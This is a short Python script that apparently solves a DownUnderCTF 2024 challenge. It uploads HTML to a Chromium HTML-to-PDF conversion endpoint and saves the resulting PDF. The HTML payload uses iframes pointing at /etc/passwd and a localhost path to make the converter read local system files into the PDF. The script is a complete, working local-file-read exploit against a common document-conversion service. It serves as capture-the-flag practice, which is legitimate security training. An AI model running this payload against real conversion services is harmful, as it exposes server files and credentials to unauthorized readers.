import requests
import base64
import io

url = "https://web-hah-got-em-20ac16c4b909.2024.ductf.dev/forms/chromium/convert/url"

html_content = """
<html>
<body>
    <h2>Flag Content</h2>
    <div class="page-break-after">
    <h2>/etc/passwd</h2>
    <iframe src="/etc/passwd"></iframe>
    <h2>\\localhost/etc/passwd</h2>
    <iframe src="\\localhost/etc/passwd"></iframe>
</div>
</body>
</html>
"""

# Create a file-like object from the HTML content
html_file = io.BytesIO(html_content.encode('utf-8'))

# Prepare the file for the request
files = {'files': ('index.html', html_file, 'text/html')}

# Send the POST request
response = requests.post(url, files=files)

# Check if the request was successful
if response.status_code == 200:
    # Save the response content (PDF) to a file
    with open('response.pdf', 'wb') as f:
        f.write(response.content)
    print("PDF saved as 'response.pdf'. The flag should be visible in this PDF.")
else:
    print(f"Request failed with status code: {response.status_code}")
    print(response.text)